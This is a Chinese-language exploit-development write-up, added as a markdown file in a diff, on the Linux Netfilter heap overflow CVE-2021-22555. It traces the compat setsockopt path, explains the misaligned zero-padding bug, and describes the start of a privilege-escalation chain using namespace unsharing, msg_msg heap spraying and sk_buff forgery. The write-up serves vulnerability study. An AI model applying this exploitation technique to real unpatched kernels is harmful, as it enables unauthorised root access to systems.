@@ -1,0 +1,1631 @@
+# 0x00.一切开始之前
+
+CVE-2021-22555 是 Linux Netfilter 模块中的一个堆溢出漏洞，获得了 `7.8` 的 CVSS 评分，漏洞主要发生在64
+位系统上为 32 位进程处理 setsockopt 时，若指定了 optname 为 `IPT_SO_SET_REPLACE`（或
+`IP6T_SO_SET_REPLACE`），且开启了内核选项 `CONFIG_USER_NS`
+、`CONFIG_NET_NS`，在内核结构转换时由于错误计算转换大小则会导致内核堆上的越界写入一些 0 字节，从而覆写相邻 object
+
+该漏洞自内核版本 `v2.6.19-rc1`
+（`9fa492cdc160cd27ce1046cb36f47d3b2b1efa21`）引入，在这些版本中被修复：
+
+  * `5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267`
+
+在开始分析之前，我们先来补充一些前置知识
+
+> 本文中涉及到的内核源码为 `5.8` 版本
+
+## _内核编译选项_
+
+首先是所有 `CONFIG_IP_NF_**` 和 `CONFIG_NETFILTER_**` 相关的选项都要打开
+
+    
+    
+    CONFIG_IP_NF_IPTABLES=y
+    CONFIG_IP_NF_MATCH_AH=y
+    CONFIG_IP_NF_MATCH_ECN=y
+    CONFIG_IP_NF_MATCH_RPFILTER=y
+    CONFIG_IP_NF_MATCH_TTL=y
+    CONFIG_IP_NF_FILTER=y
+    CONFIG_IP_NF_TARGET_REJECT=y
+    CONFIG_IP_NF_TARGET_SYNPROXY=y
+    CONFIG_IP_NF_NAT=y
+    CONFIG_IP_NF_TARGET_MASQUERADE=y
+    CONFIG_IP_NF_TARGET_NETMAP=y
+    CONFIG_IP_NF_TARGET_REDIRECT=y
+    CONFIG_IP_NF_MANGLE=y
+    CONFIG_IP_NF_TARGET_CLUSTERIP=y
+    CONFIG_IP_NF_TARGET_ECN=y
+    CONFIG_IP_NF_TARGET_TTL=y
+    CONFIG_IP_NF_RAW=y
+    CONFIG_IP_NF_SECURITY=y
+    CONFIG_IP_NF_ARPTABLES=y
+    CONFIG_IP_NF_ARPFILTER=y
+    CONFIG_IP_NF_ARP_MANGLE=y
+    
+    CONFIG_NETFILTER=y
+    CONFIG_NETFILTER_ADVANCED=y
+    
+    CONFIG_NETFILTER_INGRESS=y
+    CONFIG_NETFILTER_NETLINK=y
+    CONFIG_NETFILTER_FAMILY_BRIDGE=y
+    CONFIG_NETFILTER_FAMILY_ARP=y
+    CONFIG_NETFILTER_NETLINK_ACCT=y
+    CONFIG_NETFILTER_NETLINK_QUEUE=y
+    CONFIG_NETFILTER_NETLINK_LOG=y
+    CONFIG_NETFILTER_NETLINK_OSF=y
+    
+    CONFIG_NETFILTER_CONNCOUNT=y
+    
+    CONFIG_NETFILTER_NETLINK_GLUE_CT=y
+    
+    CONFIG_NETFILTER_SYNPROXY=y
+    
+    CONFIG_NETFILTER_XTABLES=y
+    
+    CONFIG_NETFILTER_XT_MARK=y
+    CONFIG_NETFILTER_XT_CONNMARK=y
+    CONFIG_NETFILTER_XT_SET=y
+    
+    CONFIG_NETFILTER_XT_MATCH_U32=y
+    # 挺多的，这里笔者就不一一摘录了
+    
+
+以及三个其他选项：
+
+    
+    
+    CONFIG_USER_NS=y
+    CONFIG_NET_NS=y
+    CONFIG_COMPAT=y
+    
+
+## Netfilter
+
+Netfilter 为 Linux 内核中的一个子模块，用以提供数据包过滤、网络地址转换、端口转换等功能，其整体框架如下图所示
+
+![](./img/1968166795445900423.png)
+
+例如 `iptables` 等工具便是利用 Netfilter 所提供的接口实现的，不过本篇我们主要关注其在内核中的部分
+
+Netfilter 涵盖了内核网络协议栈的多层，一个数据包在 Netfilter 中的历程如下图所示：
+
+![](./img/8029205182468573760.png)
+
+在 Netfilter 中有一种名为 「table」 的结构，用以存储不同功能的配置信息，在内核当中使用 `xt_table` 结构表示：
+
+    
+    
+    /* Furniture shopping... */
+    struct xt_table {
+        struct list_head list;
+    
+        /* What hooks you will enter on */
+        unsigned int valid_hooks;
+    
+        /* Man behind the curtain... */
+        struct xt_table_info *private;
+    
+        /* Set this to THIS_MODULE if you are a module, otherwise NULL */
+        struct module *me;
+    
+        u_int8_t af;        /* address/protocol family */
+        int priority;       /* hook order */
+    
+        /* called when table is needed in the given netns */
+        int (*table_init)(struct net *net);
+    
+        /* A unique name... */
+        const char name[XT_TABLE_MAXNAMELEN];
+    };
+    
+
+该结构其实是一层 wrapper，其核心结构为 `xt_table_info`：
+
+    
+    
+    /* The table itself */
+    struct xt_table_info {
+        /* Size per table */
+        unsigned int size;
+        /* Number of entries: FIXME. --RR */
+        unsigned int number;
+        /* Initial number of entries. Needed for module usage count */
+        unsigned int initial_entries;
+    
+        /* Entry points and underflows */
+        unsigned int hook_entry[NF_INET_NUMHOOKS];
+        unsigned int underflow[NF_INET_NUMHOOKS];
+    
+        /*
+         * Number of user chains. Since tables cannot have loops, at most
+         * @stacksize jumps (number of user chains) can possibly be made.
+         */
+        unsigned int stacksize;
+        void ***jumpstack;  //  我超，三级指针！
+    
+        unsigned char entries[] __aligned(8);
+    };
+    
+
+在每张 table 上有多个 chain，对应表示报文的拦截处理点，例如网络层中的 IP协议 便有 5 个拦截点：
+
+    
+    
+    --->[NF_IP_PRE_ROUTING]--->[ROUTE]--->[NF_IP_FORWARD]--->[NF_IP_POST_ROUTING]--->
+                                  |                        ^
+                                  |                        |
+                                  |                     [ROUTE]
+                                  v                        |
+                           [NF_IP_LOCAL_IN]        [NF_IP_LOCAL_OUT]
+                                  |                        ^
+                                  |                        |
+                                  v                        |
+                                 --------Local Process-------
+在每个 chain 中还有一些用户配置的 rule，一条 rule 可能包含一个或多个匹配规则（match）和一个执行动作（target），若报文
+match 了，则执行 target 来处理报文；标准的匹配元素包含源/目的IP地址、接收/发送设备、传输层协议这五个元素，标准的执行动作包含
+`accept`、`drop`、`queue`、`return`
+
+每条 rule 使用一个 `ipt_entry` 结构表示：
+
+    
+    
+    /* This structure defines each of the firewall rules.  Consists of 3
+       parts which are 1) general IP header stuff 2) match specific
+       stuff 3) the target to perform if the rule matches */
+    struct ipt_entry {
+        struct ipt_ip ip;
+    
+        /* Mark with fields that we care about. */
+        unsigned int nfcache;
+    
+        /* Size of ipt_entry + matches */
+        __u16 target_offset;
+        /* Size of ipt_entry + matches + target */
+        __u16 next_offset;
+    
+        /* Back pointer */
+        unsigned int comefrom;
+    
+        /* Packet and byte counters. */
+        struct xt_counters counters;
+    
+        /* The matches (if any), then the target. */
+        unsigned char elems[0];
+    };
+    
+
+而 rule 和 target 则分别使用 `xt_entry_match` 与 `xt_entry_target` 结构表示：
+
+    
+    
+    struct xt_entry_match {
+        union {
+            struct {
+                __u16 match_size;
+    
+                /* Used by userspace */
+                char name[XT_EXTENSION_MAXNAMELEN];
+                __u8 revision;
+            } user;
+            struct {
+                __u16 match_size;
+    
+                /* Used inside the kernel */
+                struct xt_match *match;
+            } kernel;
+    
+            /* Total length */
+            __u16 match_size;
+        } u;
+    
+        unsigned char data[0];
+    };
+    
+    struct xt_entry_target {
+        union {
+            struct {
+                __u16 target_size;
+    
+                /* Used by userspace */
+                char name[XT_EXTENSION_MAXNAMELEN];
+                __u8 revision;
+            } user;
+            struct {
+                __u16 target_size;
+    
+                /* Used inside the kernel */
+                struct xt_target *target;
+            } kernel;
+    
+            /* Total length */
+            __u16 target_size;
+        } u;
+    
+        unsigned char data[0];
+    };
+    
+
+`table->chain->rule` 的关系如下图所示，这里我们可以看到对于单个 rule 在每个 CPU
+上都维护了一份他的拷贝，这样做的目的是为了减少锁的使用、增加 L1 cache 的命中次数，以空间换时间
+
+![](./img/2377307879341881973.png)
+
+## 32 位下的 setsockopt 系统调用
+
+> 本次漏洞利用中我们创建 socket 时使用 `socket(AF_INTE, SOCK_STREAM, 0)`，故后面涉及到的 socket
+> 源码都会顺着这个路径分析
+
+在设置了 `CONFIG_COMPAT=y` 的情况下（意为兼容 32 位，默认开启），32位程序进行系统调用时 **实际上是通过
+COMPAT_SYSCALL_DEFINE 宏定义的兼容 32 位系统调用完成的**
+
+> 我们知道 32 位程序通过 0x80 号中断进行系统调用，而 64 位程序则通过 syscall 指令完成系统调用，因此在64位内核中将 0x80
+> 号中断专门用作兼容 32 位进程的系统调用入口
+
+因此当一个 32 位程序进行 setsockopt 系统调用时，最终会调用到 `__compat_sys_setsockopt()`
+
+    
+    
+    COMPAT_SYSCALL_DEFINE5(setsockopt, int, fd, int, level, int, optname,
+                   char __user *, optval, unsigned int, optlen)
+    {
+        return __compat_sys_setsockopt(fd, level, optname, optval, optlen);
+    }
+    
+
+> 其实 glibc 中的 setsockopt 的 wrapper 是通过 `socketcall` 这一系统调用进行的，实际上在很久以前该系统调用其实是
+> socket 相关系统调用的唯一入口点，后面各种子功能拆分成了多个系统调用，但是该系统调用仍然保留了下来，因此对于同一个功能，即可以走
+> socketcall 系统调用，也可以走拆分出来的那个系统调用，最后的路径是相同的
+
+在公开的 exp 中漏洞触发路径指定了 level 为 `SOL_IP`，故在 `__compat_sys_setsockopt()`中最终会走到
+`sock->ops->compat_setsockopt` 或 `sock->ops->setsockopt`
+
+    
+    
+    static int __compat_sys_setsockopt(int fd, int level, int optname,
+                       char __user *optval, unsigned int optlen)
+    {
+        int err;
+        struct socket *sock;
+    
+        if (optlen > INT_MAX)
+            return -EINVAL;
+    
+        sock = sockfd_lookup(fd, &err);
+        if (sock) {
+            err = security_socket_setsockopt(sock, level, optname);
+            if (err) {
+                sockfd_put(sock);
+                return err;
+            }
+    
+            if (level == SOL_SOCKET)
+                err = compat_sock_setsockopt(sock, level,
+                        optname, optval, optlen);
+            else if (sock->ops->compat_setsockopt)
+                err = sock->ops->compat_setsockopt(sock, level,
+                        optname, optval, optlen);
+            else
+                err = sock->ops->setsockopt(sock, level,
+                        optname, optval, optlen);
+            sockfd_put(sock);
+        }
+        return err;
+    }
+    
+
+这里应该走入哪条路径？那么这里我们需要先看创建该函数表的过程，这个函数表其实是在 socket
+创建时（`__sock_create()`）进行动态指定的，通过对应 family 指定的创建函数进行创建：
+
+    
+    
+    int __sock_create(struct net *net, int family, int type, int protocol,
+                 struct socket **res, int kern)
+    {
+        int err;
+        struct socket *sock;
+        const struct net_proto_family *pf;
+        //...
+        rcu_read_lock();
+        pf = rcu_dereference(net_families[family]);
+        err = -EAFNOSUPPORT;
+        if (!pf)
+            goto out_release;
+    
+        /*
+         * We will call the ->create function, that possibly is in a loadable
+         * module, so we have to bump that loadable module refcnt first.
+         */
+        if (!try_module_get(pf->owner))
+            goto out_release;
+    
+        /* Now protected by module ref count */
+        rcu_read_unlock();
+    
+        err = pf->create(net, sock, protocol, kern);
+    
+
+比如说对于 `AF_INET` （`PF_INET`）而言，应该用到的是 `inet_create()` 函数：
+
+    
+    
+    static const struct net_proto_family inet_family_ops = {
+        .family = PF_INET,
+        .create = inet_create,
+        .owner  = THIS_MODULE,
+    };
+    
+
+在 `inet_init()` 函数中使用 `sock_register` 在 `net_families` 数组中注册了该结构体（`__init`
+宏可以看出这是一个模块初始化函数）：
+
+    
+    
+    static int __init inet_init(void)
+    {
+            /*
+         *  Tell SOCKET that we are alive...
+         */
+    
+        (void)sock_register(&inet_family_ops);
+    
+
+而在 `inet_create()` 中，则是遍历 数组找到对应类型的函数表给到 socket：
+
+    
+    
+    static int inet_create(struct net *net, struct socket *sock, int protocol,
+                   int kern)
+    {
+        struct sock *sk;
+        struct inet_protosw *answer;
+        struct inet_sock *inet;
+        struct proto *answer_prot;
+        unsigned char answer_flags;
+        int try_loading_module = 0;
+        int err;
+    
+        if (protocol < 0 || protocol >= IPPROTO_MAX)
+            return -EINVAL;
+    
+        sock->state = SS_UNCONNECTED;
+    
+        /* Look for the requested type/protocol pair. */
+    lookup_protocol:
+        err = -ESOCKTNOSUPPORT;
+        rcu_read_lock();
+        list_for_each_entry_rcu(answer, &inetsw[sock->type], list) {
+    
+            err = 0;
+            /* Check the non-wild match. */
+            if (protocol == answer->protocol) {
+                if (protocol != IPPROTO_IP)
+                    break;
+            } else {
+                /* Check for the two wild cases. */
+                if (IPPROTO_IP == protocol) {
+                    protocol = answer->protocol;
+                    break;
+                }
+                if (IPPROTO_IP == answer->protocol)
+                    break;
+            }
+            err = -EPROTONOSUPPORT;
+        }
+        //...
+        sock->ops = answer->ops;
+        answer_prot = answer->prot;
+    
+
+在这里使用内核的 rcu 遍历宏 `list_for_each_entry_rcu` 对 `inetsw` 进行遍历，实际上该链表通过
+`inetsw_array` 建立，对于 `IPPROTO_IP` 而言其函数表应为 `inet_stream_ops`（我们在建立 socket 时
+protocol 指定为 0，即 `IPPROTO_IP`）：
+
+    
+    
+    static struct inet_protosw inetsw_array[] =
+    {
+        {
+            .type =       SOCK_STREAM,
+            .protocol =   IPPROTO_TCP,
+            .prot =       &tcp_prot,
+            .ops =        &inet_stream_ops,
+            .flags =      INET_PROTOSW_PERMANENT |
+                      INET_PROTOSW_ICSK,
+        },
+    
+
+因此我们在进行 setsockopt 时其实对应应该调用到 `inet_stream_ops` 中的函数，这里因为我们开启了编译选项
+`CONFIG_COMPAT`（默认开启）， **所以 setsockopt
+系统调用最终应该会调用到**`compat_sock_common_setsockopt`
+
+    
+    
+    const struct proto_ops inet_stream_ops = {
+        //...
+    #ifdef CONFIG_COMPAT
+        .compat_setsockopt = compat_sock_common_setsockopt,
+        .compat_getsockopt = compat_sock_common_getsockopt,
+        .compat_ioctl      = inet_compat_ioctl,
+    #endif
+        .set_rcvlowat      = tcp_set_rcvlowat,
+    };
+    
+
+他又会调用到 `sk->sk_prot->compat_setsockopt()`，其实就是 socket 结构体里的 sock 结构体里的
+sock_common 结构体的 `skc_prot` 成员（`proto` 结构体类型）的 `compat_setsockopt` 函数指针（
+~~究极套娃~~ ）
+
+    
+    
+    #ifdef CONFIG_COMPAT
+    int compat_sock_common_setsockopt(struct socket *sock, int level, int optname,
+                      char __user *optval, unsigned int optlen)
+    {
+        struct sock *sk = sock->sk;
+    
+        if (sk->sk_prot->compat_setsockopt != NULL)
+            return sk->sk_prot->compat_setsockopt(sk, level, optname,
+                                  optval, optlen);
+        return sk->sk_prot->setsockopt(sk, level, optname, optval, optlen);
+    }
+    EXPORT_SYMBOL(compat_sock_common_setsockopt);
+    #endif
+    
+
+又绕回到 `inet_create`，这里应该是对应到 `tcp_prot` 函数表，对应调用到 `compat_tcp_setsockopt()`：
+
+    
+    
+    struct proto tcp_prot = {
+        .name           = "TCP",
+        //...
+    #ifdef CONFIG_COMPAT
+        .compat_setsockopt  = compat_tcp_setsockopt,
+        .compat_getsockopt  = compat_tcp_getsockopt,
+    #endif
+        .diag_destroy       = tcp_abort,
+    };
+    EXPORT_SYMBOL(tcp_prot);
+    
+
+在公开的 exp 中漏洞触发路径指定了 level 为 `SOL_IP`，所以这里应该会对应调用到 `inet_csk_compat_setsockopt`
+
+    
+    
+    #ifdef CONFIG_COMPAT
+    int compat_tcp_setsockopt(struct sock *sk, int level, int optname,
+                  char __user *optval, unsigned int optlen)
+    {
+        if (level != SOL_TCP)
+            return inet_csk_compat_setsockopt(sk, level, optname,
+                              optval, optlen);
+        return do_tcp_setsockopt(sk, level, optname, optval, optlen);
+    }
+    EXPORT_SYMBOL(compat_tcp_setsockopt);
+    #endif
+    
+
+在 `inet_csk_compat_setsockopt` 中会调用到 `icsk->icsk_af_ops->compat_setsockopt()`
+
+    
+    
+    int inet_csk_compat_setsockopt(struct sock *sk, int level, int optname,
+                       char __user *optval, unsigned int optlen)
+    {
+        const struct inet_connection_sock *icsk = inet_csk(sk);
+    
+        if (icsk->icsk_af_ops->compat_setsockopt)
+            return icsk->icsk_af_ops->compat_setsockopt(sk, level, optname,
+                                    optval, optlen);
+        return icsk->icsk_af_ops->setsockopt(sk, level, optname,
+                             optval, optlen);
+    }
+    EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);
+    #endif
+    
+
+这里 `inet_csk()` 展开其实就是一个强制类型转换，那这里我们又要转回去看 **socket 中 sock 结构体的初始化过程** ，在
+`inet_create()` 中使用 `sock_alloc()` 创建 sock 结构体，最后会调用到
+`tcp_v4_init_sock`，这里我们看到其初始化所用的函数表为 `ipv4_specific`：
+
+    
+    
+    static int tcp_v4_init_sock(struct sock *sk)
+    {
+        struct inet_connection_sock *icsk = inet_csk(sk);
+    
+        tcp_init_sock(sk);
+    
+        icsk->icsk_af_ops = &ipv4_specific;
+    
+    #ifdef CONFIG_TCP_MD5SIG
+        tcp_sk(sk)->af_specific = &tcp_sock_ipv4_specific;
+    #endif
+    
+        return 0;
+    }
+    
+
+所以最后应该调用到 `compat_ip_setsockopt()`
+
+    
+    
+    const struct inet_connection_sock_af_ops ipv4_specific = {
+        .queue_xmit    = ip_queue_xmit,
+        .send_check    = tcp_v4_send_check,
+        .rebuild_header    = inet_sk_rebuild_header,
+        .sk_rx_dst_set     = inet_sk_rx_dst_set,
+        .conn_request      = tcp_v4_conn_request,
+        .syn_recv_sock     = tcp_v4_syn_recv_sock,
+        .net_header_len    = sizeof(struct iphdr),
+        .setsockopt    = ip_setsockopt,
+        .getsockopt    = ip_getsockopt,
+        .addr2sockaddr     = inet_csk_addr2sockaddr,
+        .sockaddr_len      = sizeof(struct sockaddr_in),
+    #ifdef CONFIG_COMPAT
+        .compat_setsockopt = compat_ip_setsockopt,
+        .compat_getsockopt = compat_ip_getsockopt,
+    #endif
+        .mtu_reduced       = tcp_v4_mtu_reduced,
+    };
+    
+
+由于我们开启了 Netfilter，所以在 `compat_ip_setsockopt()` 最后会调用到 `compat_nf_setsockopt` ：
+
+    
+    
+    #ifdef CONFIG_COMPAT
+    int compat_ip_setsockopt(struct sock *sk, int level, int optname,
+                 char __user *optval, unsigned int optlen)
+    {
+        //...
+        #ifdef CONFIG_NETFILTER
+        /* we need to exclude all possible ENOPROTOOPTs except default case */
+        if (err == -ENOPROTOOPT && optname != IP_HDRINCL &&
+                optname != IP_IPSEC_POLICY &&
+                optname != IP_XFRM_POLICY &&
+                !ip_mroute_opt(optname))
+            err = compat_nf_setsockopt(sk, PF_INET, optname, optval,
+                           optlen);
+    #endif
+        return err;
+    }
+    EXPORT_SYMBOL(compat_ip_setsockopt);
+    #endif
+    
+
+这个函数和 `compat_nf_getsockopt()` 一样都是 `compat_nf_sockopt()` 的 wrapper，在该函数中会使用
+找到对应的函数表，根据对应操作调用对应函数，我们是 32 位进程的系统调用，所以应该走入 `compat_set`这一指针
+
+    
+    
+    #ifdef CONFIG_COMPAT
+    static int compat_nf_sockopt(struct sock *sk, u_int8_t pf, int val,
+                     char __user *opt, int *len, int get)
+    {
+        struct nf_sockopt_ops *ops;
+        int ret;
+    
+        ops = nf_sockopt_find(sk, pf, val, get);
+        if (IS_ERR(ops))
+            return PTR_ERR(ops);
+    
+        if (get) {
+            if (ops->compat_get)
+                ret = ops->compat_get(sk, val, opt, len);
+            else
+                ret = ops->get(sk, val, opt, len);
+        } else {
+            if (ops->compat_set)
+                ret = ops->compat_set(sk, val, opt, *len);
+            else
+                ret = ops->set(sk, val, opt, *len);
+        }
+    
+        module_put(ops->owner);
+        return ret;
+    }
+    
+
+那么具体调用到哪个函数？在 `nf_sockopt_find` 中使用内核双向链表遍历宏遍历全局变量`nf_sockopts`，判断条件是函数表的 pf
+等于我们在上层传入的 pf（在 `compat_ip_setsockopt` 中传入的为 `PF_INET`）
+
+    
+    
+    static struct nf_sockopt_ops *nf_sockopt_find(struct sock *sk, u_int8_t pf,
+            int val, int get)
+    {
+        struct nf_sockopt_ops *ops;
+    
+        mutex_lock(&nf_sockopt_mutex);
+        list_for_each_entry(ops, &nf_sockopts, list) {
+            if (ops->pf == pf) {
+                if (!try_module_get(ops->owner))
+                    goto out_nosup;
+    
+                if (get) {
+                    if (val >= ops->get_optmin &&
+                            val < ops->get_optmax)
+                        goto out;
+                } else {
+                    if (val >= ops->set_optmin &&
+                            val < ops->set_optmax)
+                        goto out;
+                }
+                module_put(ops->owner);
+            }
+        }
+    out_nosup:
+        ops = ERR_PTR(-ENOPROTOOPT);
+    out:
+        mutex_unlock(&nf_sockopt_mutex);
+        return ops;
+    }
+    
+
+**在 iptables 模块的初始化函数中注册了函数表** `ipt_sockopts`，`nf_register_sockopt()` 用以在
+`nf_sockopts` 链表中插入节点：
+
+    
+    
+    static int __init ip_tables_init(void)
+    {
+        //...
+    
+        /* Register setsockopt */
+        ret = nf_register_sockopt(&ipt_sockopts);
+    
+
+那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 `compat_do_ipt_set_ctl` 函数：
+
+    
+    
+    static struct nf_sockopt_ops ipt_sockopts = {
+        .pf     = PF_INET,
+        .set_optmin = IPT_BASE_CTL,
+        .set_optmax = IPT_SO_SET_MAX+1,
+        .set        = do_ipt_set_ctl,
+    #ifdef CONFIG_COMPAT
+        .compat_set = compat_do_ipt_set_ctl,
+    #endif
+        .get_optmin = IPT_BASE_CTL,
+        .get_optmax = IPT_SO_GET_MAX+1,
+        .get        = do_ipt_get_ctl,
+    #ifdef CONFIG_COMPAT
+        .compat_get = compat_do_ipt_get_ctl,
+    #endif
+        .owner      = THIS_MODULE,
+    };
+    
+
+# 0x01.漏洞分析
+
+前面讲到 32 位程序的 setsockopt 系统调用最终会调用到 `compat_do_ipt_set_ctl()`，而漏洞便发生在当我们指定
+optname 为 `IPT_SO_SET_REPLACE` 时，其最终会调用 `compat_do_replace()`
+
+    
+    
+    static int
+    compat_do_ipt_set_ctl(struct sock *sk,  int cmd, void __user *user,
+                  unsigned int len)
+    {
+        int ret;
+    
+        if (!ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))
+            return -EPERM;
+    
+        switch (cmd) {
+        case IPT_SO_SET_REPLACE:
+            ret = compat_do_replace(sock_net(sk), user, len);
+            break;
+    
+        case IPT_SO_SET_ADD_COUNTERS:
+            ret = do_add_counters(sock_net(sk), user, len, 1);
+            break;
+    
+        default:
+            ret = -EINVAL;
+        }
+    
+        return ret;
+    }
+    
+
+存在如下调用链：
+
+    
+    
+    compat_do_ipt_set_ctl()
+        compat_do_replace()
+            translate_compat_table()
+                compat_copy_entry_from_user()
+                    xt_compat_match_from_user()
+                    xt_compat_target_from_user()
+    
+
+这里提前说明： **漏洞在** `xt_compat_match_from_user()` **与**
+`xt_compat_target_from_user()` **中都存在，逻辑相同**
+
+我们先来看 `xt_compat_target_from_user()`，在这里会将 `t->data + target->targetsize`
+起始的长度为 `pad` 的区域置 0：先将 targetsize 向上与 8 对齐，之后再减去 targetsize，剩下的这段自然就是分配的
+object 减去 targetsize 后的剩余空间
+
+    
+    
+    void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
+                    unsigned int *size)
+    {
+        const struct xt_target *target = t->u.kernel.target;
+        struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
+        int pad, off = xt_compat_target_offset(target);
+        u_int16_t tsize = ct->u.user.target_size;
+        char name[sizeof(t->u.user.name)];
+    
+        t = *dstptr;
+        memcpy(t, ct, sizeof(*ct));
+        if (target->compat_from_user)
+            target->compat_from_user(t->data, ct->data);
+        else
+            memcpy(t->data, ct->data, tsize - sizeof(*ct));
+        pad = XT_ALIGN(target->targetsize) - target->targetsize;
+        if (pad > 0)
+            memset(t->data + target->targetsize, 0, pad);   // 漏洞产生点
+    
+        tsize += off;
+        t->u.user.target_size = tsize;
+        strlcpy(name, target->name, sizeof(name));
+        module_put(target->me);
+        strncpy(t->u.user.name, name, sizeof(t->u.user.name));
+    
+        *size += off;
+        *dstptr += tsize;
+    }
+    EXPORT_SYMBOL_GPL(xt_compat_target_from_user);
+    
+
+理想情况下，应该是按照如下方式进行清零的，看起来好像没有什么问题？（下图例子中假设 targetsize 小于 8）
+
+![](./img/5776830934093244019.png)
+
+**但是 t- >data 并不一定是 8 字节对齐的，而我们计算 pad 时却默认 t->data 应当 8 字节对齐**，因此若 t->data 并非
+8 字节对齐，而 pad 计算时向上与 8 字节对齐， **就会导致越界写入数字节的 0 到相邻的下一个 object 中**
+
+![](./img/4987742450612690649.png)
+
+这里笔者对公开的 exp 进行调试，可以看到的是 t->data **确乎可以为一个非 8 字节对齐的地址，而此时 target- >targetsize
+再向上对 8 字节对齐，自然就会越界写到相邻下一 object 的开头**
+
+![](./img/430671421299246924.png)
+
+在 `xt_compat_match_from_user()` 中产生的漏洞逻辑相同，这里就不赘叙了
+
+    
+    
+    void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
+                       unsigned int *size)
+    {
+        const struct xt_match *match = m->u.kernel.match;
+        struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;
+        int pad, off = xt_compat_match_offset(match);
+        u_int16_t msize = cm->u.user.match_size;
+        char name[sizeof(m->u.user.name)];
+    
+        m = *dstptr;
+        memcpy(m, cm, sizeof(*cm));
+        if (match->compat_from_user)
+            match->compat_from_user(m->data, cm->data);
+        else
+            memcpy(m->data, cm->data, msize - sizeof(*cm));
+        pad = XT_ALIGN(match->matchsize) - match->matchsize;
+        if (pad > 0)
+            memset(m->data + match->matchsize, 0, pad); // 漏洞产生点
+    
+        msize += off;
+        m->u.user.match_size = msize;
+        strlcpy(name, match->name, sizeof(name));
+        module_put(match->me);
+        strncpy(m->u.user.name, name, sizeof(m->u.user.name));
+    
+        *size += off;
+        *dstptr += msize;
+    }
+    EXPORT_SYMBOL_GPL(xt_compat_match_from_user);
+    
+
+# 0x02.漏洞利用
+
+接下来我们来考虑如何利用这个越界写 0 的漏洞，现在公开的这一份 exp 利用 `msg_msg` 构造 UAF、利用 `sk_buff` 写入
+object、利用 `pipe_buffer` 劫持 RIP，笔者认为这是一个很好的思路，所以后面笔者构造 exp 也会遵循同样的思路完成
+
+> 下面的图例大部分来自 [Google 的 security research
+> 博客](https://google.github.io/security-> research/pocs/linux/cve-2021-22555/writeup.html)，非常感谢 Google 做出了如此简单易懂的图例！
+
+## 提权
+
+### Step.O 开始前的准备工作
+
+为了触发到漏洞的路径，我们应当使用 `unshare()` 隔离出对应的的命名空间，同时为了提高堆喷的稳定性，我们将进程绑定到固定核心上
+
+    
+    
+    if (unshare(CLONE_NEWUSER) < 0)
+            errExit("failed to unshare(CLONE_NEWUSER)");
+        if (unshare(CLONE_NEWNET) < 0)
+            errExit("failed to unshare(CLONE_NEWNET)");
+    
+        CPU_ZERO(&cpu_set);
+        CPU_SET(0, &cpu_set);
+        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+    
+
+> 如果不隔离出独立命名空间的话 **便不会走到触发漏洞的路径** ，因为我们需要 `CAP_SYS_ADMIN`
+> 权限，作为普通用户只能通过命名空间隔离进行获取
+
+### Step.I 堆喷 `msg_msg` ，建立主从消息队列，构造重叠辅助消息
+
+现在我们有了一个堆上 off-by-one，我们该怎么利用呢？比较朴素的一种思想便是覆写一个头部为指针的结构体，利用 partial overwrite
+使得两个这样的结构体的头部指针指向同一个结构体， **从而实现 object overlapping**
+
+那么选用什么样的结构体作为 victim 呢？这里我们选择使用 `msg_msg`
+这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：
+
+    
+    
+    /* one msg_msg structure for each message */
+    struct msg_msg {
+        struct list_head m_list;
+        long m_type;
+        size_t m_ts;        /* message text size */
+        struct msg_msgseg *next;
+        void *security;
+        /* the actual message follows immediately */
+    };
+    
+
+当我们在一个消息队列上发送多个消息时，会形成如下结构：
+
+![](./img/7658670084451496540.png)
+
+我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为
+0x1000，第二条消息（辅助消息）的大小为 0x400：
+
+![](./img/1327989648480525205.png)
+
+之后我们读出其中几个消息队列的主消息，再利用 setsockopt 获取到我们刚释放的 `msg_msg` 结构体的空间
+
+![](./img/1647790488371132906.png)
+
+这样就会导致 `xt_table_info` 结构体覆写到其相邻的主消息的 next 指针，从而导致
+**在两个消息队列上存在两个主消息指向同一个辅助消息**
+
+![](./img/8760898789637745073.png)
+
+我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列
+
+> 利用 `MSG_COPY`
+> 标志位可以读取消息队列上的消息而不释放，参见[这里](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-> KERNEL-PWN-PART-> IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D)
+
+### Step.II 释放辅助消息，构造 UAF
+
+此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时 **我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object
+已经在 freelist 上了**
+
+![](./img/7119871343691003745.png)
+
+### Step.III 堆喷 `sk_buff` 伪造辅助消息，泄露 UAF obj 地址
+
+接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 `msg_msg`
+结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——`sk_buff`，类似于
+`msg_msg`，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 `msg_msg` 由一个 header 加上用户数据组成，而
+`sk_buff` 本身不包含任何用户数据， **用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针**
+
+![](./img/9189954752271170166.png)
+
+至于这个结构体的分配与释放也是十分简单， **sk_buff 在内核网络协议栈中代表一个「包」，** 我们不难想到的是 **我们只需要创建一对
+socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放** ，最简单的办法便是用 socketpair 系统调用创建一对
+socket，之后对其 read & write 便能完成收发包的工作
+
